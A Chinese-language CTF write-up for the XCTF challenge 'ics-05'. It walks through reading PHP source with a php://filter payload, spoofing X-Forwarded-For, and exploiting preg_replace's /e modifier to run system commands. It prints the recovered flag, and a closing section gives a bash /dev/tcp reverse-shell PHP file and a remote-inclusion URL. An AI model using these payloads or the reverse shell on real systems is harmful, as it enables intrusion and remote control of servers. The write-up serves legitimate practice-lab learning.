# ics-05

https://adworld.xctf.org.cn/challenges/list?rwNmOdr=1720882450063

经验总结：这一道题是web的php的理解与代码审计，对于我来说是一个盲点，因为php不会，暑假应该深刻突破

初见感受：

这道题上来是一个管理系统，对于一个管理系统，我的想法有以下几点：

##### 1，有没有后台地址可以利用，后台的利用我的想法是

（1，在搜索引擎上找相关，但是这个程序我不知道是什么管理系统做的，搜索没有相关线索

（2，能不能用gobuster去爆破出，但是一般的ctf或者awd感觉使用gobuster的爆破可能性都不高，更强调手动的使用而不是工具，不同于靶机，gobuster爆破也基本没什么有价值信息

在此时根据唯一能进行的几个页面，发现一个地方很值得去操作

![image-20240714013810142](C:\Users\10649\AppData\Roaming\Typora\typora-user-images\image-20240714013810142.png)

在双击了平台设备维护中心后，可以发现上面的url跳动了，但是这如何利用，属于php的知识盲区，遂看writeup：

#### php的filter利用

其中使用了php的filter函数，php://filter简单理解：

php://filter 是php中独有的一个协议，可以作为一个中间流来处理其他流，可以进行任意文件的读取；根据名字，filter，可以很容易想到这个协议可以用来过滤一些东西；

使用不同的参数可以达到不同的目的和效果：

名称	描述	备注
resource=<要过滤的数据流>	指定了你要筛选过滤的数据流。	必选
read=<读链的筛选列表>	可以设定一个或多个过滤器名称，以管道符（|）分隔。	可选
write=<写链的筛选列表>	可以设定一个或多个过滤器名称，以管道符（|）分隔。	可选
<；两个链的筛选列表>	任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。	 
另外用read的解释：

![img](https://i-blog.csdnimg.cn/blog_migrate/c75d9ee44b370000f5eb3d09dd43027a.png)

我们以此构造出一个filter的playload

```
index?page=php://filter/read=convert.base64-encode/recourse=index.php
```

通过base64解码后得到php文件

```php
<?php
error_reporting(0);

@session_start();
posix_setuid(1000);


?>
<!DOCTYPE HTML>
<html>

<head>
    <meta charset="utf-8">
    <meta name="renderer" content="webkit">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <link rel="stylesheet" href="layui/css/layui.css" media="all">
    <title>设备维护中心</title>
    <meta charset="utf-8">
</head>

<body>
    <ul class="layui-nav">
        <li class="layui-nav-item layui-this"><a href="?page=index">云平台设备维护中心</a></li>
    </ul>
    <fieldset class="layui-elem-field layui-field-title" style="margin-top: 30px;">
        <legend>设备列表</legend>
    </fieldset>
    <table class="layui-hide" id="test"></table>
    <script type="text/html" id="switchTpl">
        <!-- 这里的 checked 的状态只是演示 -->
        <input type="checkbox" name="sex" value="{{d.id}}" lay-skin="switch" lay-text="开|关" lay-filter="checkDemo" {{ d.id==1 0003 ? 'checked' : '' }}>
    </script>
    <script src="layui/layui.js" charset="utf-8"></script>
    <script>
    layui.use('table', function() {
        var table = layui.table,
            form = layui.form;

        table.render({
            elem: '#test',
            url: '/somrthing.json',
            cellMinWidth: 80,
            cols: [
                [
                    { type: 'numbers' },
                     { type: 'checkbox' },
                     { field: 'id', title: 'ID', width: 100, unresize: true, sort: true },
                     { field: 'name', title: '设备名', templet: '#nameTpl' },
                     { field: 'area', title: '区域' },
                     { field: 'status', title: '维护状态', minWidth: 120, sort: true },
                     { field: 'check', title: '设备开关', width: 85, templet: '#switchTpl', unresize: true }
                ]
            ],
            page: true
        });
    });
    </script>
    <script>
    layui.use('element', function() {
        var element = layui.element; //导航的hover效果、二级菜单等功能，需要依赖element模块
        //监听导航点击
        element.on('nav(demo)', function(elem) {
            //console.log(elem)
            layer.msg(elem.text());
        });
    });
    </script>

<?php

$page = $_GET[page];

if (isset($page)) {



if (ctype_alnum($page)) {
?>

    <br /><br /><br /><br />
    <div style="text-align:center">
        <p class="lead"><?php echo $page; die();?></p>
    <br /><br /><br /><br />

<?php

}else{

?>
        <br /><br /><br /><br />
        <div style="text-align:center">
            <p class="lead">
                <?php

                if (strpos($page, 'input') > 0) {
                    die();
                }

                if (strpos($page, 'ta:text') > 0) {
                    die();
                }

                if (strpos($page, 'text') > 0) {
                    die();
                }

                if ($page === 'index.php') {
                    die('Ok');
                }
                    include($page);
                    die();
                ?>
        </p>
        <br /><br /><br /><br />

<?php
}}


//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试

if ($_SERVER['HTTP_X_FORWARDED_FOR'] === '127.0.0.1') {

    echo "<br >Welcome My Admin ! <br >";

    $pattern = $_GET[pat];
    $replacement = $_GET[rep];
    $subject = $_GET[sub];

    if (isset($pattern) && isset($replacement) && isset($subject)) {
        preg_replace($pattern, $replacement, $subject);
    }else{
        die();
    }

}





?>

</body>

</html>

```

看到肯定是127的本地测试有利用的价值,抓包将http表头伪造

```
X-Forwarded-For: 127.0.0.1
```

对于执行的函数。`preg_replace` 是 PHP 中的一个函数，用于执行正则表达式的搜索和替换操作。它可以根据指定的模式在字符串中查找匹配的部分，并用替换字符串进行替换。

#### 语法

```php
preg_replace(mixed $pattern, mixed $replacement, mixed $subject[, int $limit = -1[, int &$count]])
```

### 参数说明

- **$pattern**：要搜索的模式，可以是字符串或字符串数组。
- **$replacement**：用于替换的字符串或字符串数组。
- **$subject**：要搜索替换的目标字符串或字符串数组。
- **$limit**（可选）：每个模式用于每个 subject 字符串的最大可替换次数。默认是 -1（无限制）。
- **$count**（可选）：为替换执行的次数。

### 返回值

- 如果 `$subject` 是一个数组，`preg_replace` 返回一个数组。
- 其他情况下返回一个字符串。
- 如果匹配被查找到，替换后的 `$subject` 被返回，否则返回没有改变的 `$subject`。
- [如果发生错误，返回 `NULL`](https://www.runoob.com/php/php-preg_replace.html)[1](https://www.runoob.com/php/php-preg_replace.html)[2](https://www.php.net/manual/zh/function.preg-replace.php).

### 示例

1. **简单替换**

```php
$string = 'Hello World';
$pattern = '/World/';
$replacement = 'PHP';
echo preg_replace($pattern, $replacement, $string); // 输出 "Hello PHP"
```

1. **删除空格字符**

```php
$str = 'Hello   World';
$str = preg_replace('/\s+/', '', $str); // 将会改变为 'HelloWorld'
echo $str;
```

1. **基于数组索引的搜索替换**

```php
$string = 'The quick brown fox jumps over the lazy dog.';
$patterns = ['/quick/', '/brown/', '/fox/'];
$replacements = ['slow', 'black', 'bear'];
echo preg_replace($patterns, $replacements, $string); // 输出 "The slow black bear jumps over the lazy dog."
```

但是这个吊毛函数怎么利用呢，查询网络：当使用 `/e` 修饰符时。

### /e修饰符的安全问题

`/e` 修饰符会将替换字符串作为 PHP 代码执行，这可能导致代码执行漏洞。例如：

```php
$pattern = '/(.*)/e';
$replacement = 'strtolower("$1")';
$subject = '{${phpinfo()}}';
echo preg_replace($pattern, $replacement, $subject);
```

在这个例子中，`preg_replace` 会将 `$replacement` 作为 PHP 代码执行，导致 `phpinfo()` 函数被调用。这种情况下，攻击者可以通过控制输入来执行任意代码

 那就尝试

```
pat= /(.*)/e&rep=strtolower("$1")&sub={${phpinfo()}}
```

![image-20240714010718225](C:\Users\10649\AppData\Roaming\Typora\typora-user-images\image-20240714010718225.png)                          

显示出了php信息，以此我们可以继续尝试构造          

```
pat=%20/123/e&rep=system("ls")&sub=123
```

css index.html index.php js layui logo.png s3chahahaDir start.sh 视图.png

继续执行

```php
pat=%20/123/e&rep=system("cd 3chahahaDir%20 && ls")&sub=123
```

小b藏的挺深，在flag里的一个flag.php，打开它还不显示出来，因为他会显示在网页代码中，查看到

```
<!--?php

$flag = 'cyberpeace{bb62ea56b1b70cb142f762c54d899e7d}';

?-->
```

### 总结：

这道题考察的思路就是对php的代码审计与filter协议的利用，函数preg_replace的利用。只有知道这些关于php的漏洞才能成功执行这道题。

#### 额外的思路

我看到由ai提到的远程操作漏洞，有如下想法：

能不能在kali上开一个80端口上传一个php反弹shell回靶机呢？

编写一个反弹shell

```php
<?php
exec("/bin/bash -c 'bash -i > /dev/tcp/192.168.213.129/1234 0>&1'");
？>
```

然后利用远程操作漏洞直接运行这个php

```
http://61.147.171.105:57861/index.php?page=http://192.168.213.129/shell.php
```

但是为什么不行呢？

因为这是对php太想当然了,审计代码得知虽然这里由include函数执行的php文件，但是一般的服务器都会禁止include执行带有url的命令，不然直接远程弹shell，什么服务器不能打？

### 远程文件包含漏洞

php.ini的配置选项allow_url_include为On的话，文件包含函数是可以加载远程文件的，这一道题不适用
